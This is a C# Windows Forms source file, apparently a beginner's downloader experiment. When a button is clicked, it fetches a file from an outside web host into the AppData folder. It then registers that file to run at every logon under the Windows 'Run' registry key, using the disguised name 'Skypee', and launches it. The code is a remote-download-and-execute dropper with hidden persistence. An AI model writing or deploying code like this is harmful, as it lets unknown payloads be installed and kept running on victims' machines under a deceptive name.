using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using Microsoft.Win32;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using IWshRuntimeLibrary;

namespace ExeExeExe
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string startMenuPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        private void button1_Click(object sender, EventArgs e)
        {
            download("https://kalitelimedya.com/baba.html", appData + "/deneme2.html",appData + "/deneme2.html");
        }
        void download(string downloadlink, string downloadtargetpath, string shortcuttargetpath)
        {
           

            WebClient wc = new WebClient();
            wc.DownloadFileAsync(new Uri(downloadlink), downloadtargetpath);
            string ProgramAdi = "Skypee";
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue(ProgramAdi, shortcuttargetpath);
            Process.Start(shortcuttargetpath);
        }

        private void Abc_Tick(object sender, EventArgs e)
        {
            
        }
        List<String> linkler = new List<string>();
        private void Form1_Load(object sender, EventArgs e)
        {
            System.Windows.Forms.Timer abc = new System.Windows.Forms.Timer();
            abc.Interval = 5000;
            abc.Tick += Abc_Tick;
            abc.Start();

        }
    }
}
